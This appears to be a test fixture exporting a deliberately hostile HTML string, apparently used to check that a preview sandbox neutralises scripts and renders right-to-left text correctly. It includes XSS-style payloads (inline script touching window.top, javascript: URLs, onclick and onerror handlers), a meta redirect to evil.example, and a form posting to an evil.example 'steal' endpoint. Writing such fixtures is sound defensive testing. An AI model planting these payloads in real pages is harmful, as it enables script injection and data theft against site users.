export const PREVIEW_FIXTURE_BASE_URL = "https://example.com/fixture";

export const PREVIEW_FIXTURE_HTML = `<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <title>Hostile fixture</title>
    <script>window.top.document.title = "pwned"</script>
    <style>
      html, body { background: lime !important; color: magenta !important; }
      .rtl-block { direction: rtl; unicode-bidi: isolate; text-align: start; }
    </style>
    <meta http-equiv="refresh" content="0;url=https://evil.example/" />
    <link rel="stylesheet" href="javascript:alert(1)" />
  </head>
  <body>
    <h1 onclick="alert(1)">Isolated fixture heading</h1>
    <p>Latin paragraph with <a href="javascript:alert(1)">unsafe link</a>.</p>
    <p dir="rtl" lang="ar">مرحبا 123 https://example.com</p>
    <p dir="rtl" lang="he">שלום 42</p>
    <p dir="rtl" lang="fa">سلام دنیا</p>
    <p lang="en">Contact مكتب support 123 https://example.com today.</p>
    <p>שלום without explicit dir</p>
    <p class="rtl-block" lang="ur">اردو متن 456</p>
    <img src="x" onerror="window.top.document.body.style.background='red'" />
    <form action="https://evil.example/steal"><button>Send</button></form>
    <iframe src="https://example.com"></iframe>
  </body>
</html>`;
